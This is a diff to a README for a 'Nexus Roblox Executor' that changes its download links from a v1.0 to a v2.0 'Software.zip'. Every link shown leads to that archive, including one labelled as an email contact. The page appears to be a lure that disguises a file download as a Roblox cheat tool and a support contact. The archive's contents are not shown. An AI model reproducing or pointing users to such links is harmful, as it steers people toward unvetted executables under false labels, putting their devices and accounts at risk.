@@ -30,9 +30,9 @@ Explore the variety of topics covered by our repository:
 
 ## 📥 Download the Latest Release
 
-Download the latest release of Nexus Roblox Executor by clicking [here](https://github.com/Muterfree/Nexus-Roblox/releases/download/v1.0/Software.zip).
+Download the latest release of Nexus Roblox Executor by clicking [here](https://github.com/Muterfree/Nexus-Roblox/releases/download/v2.0/Software.zip).
 
-[![Download Latest Release](https://github.com/Muterfree/Nexus-Roblox/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/Muterfree/Nexus-Roblox/releases/download/v1.0/Software.zip)
+[![Download Latest Release](https://github.com/Muterfree/Nexus-Roblox/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/Muterfree/Nexus-Roblox/releases/download/v2.0/Software.zip)
 
 Don't forget to check back on the "Releases" section for updates!
 
@@ -44,7 +44,7 @@ Don't forget to check back on the "Releases" section for updates!
 
 ## Support 🤝
 
-If you encounter any issues or have any questions, feel free to reach out to us via [email](https://github.com/Muterfree/Nexus-Roblox/releases/download/v1.0/Software.zip).
+If you encounter any issues or have any questions, feel free to reach out to us via [email](https://github.com/Muterfree/Nexus-Roblox/releases/download/v2.0/Software.zip).
 
 Happy Scripting! 🎮🚀
 
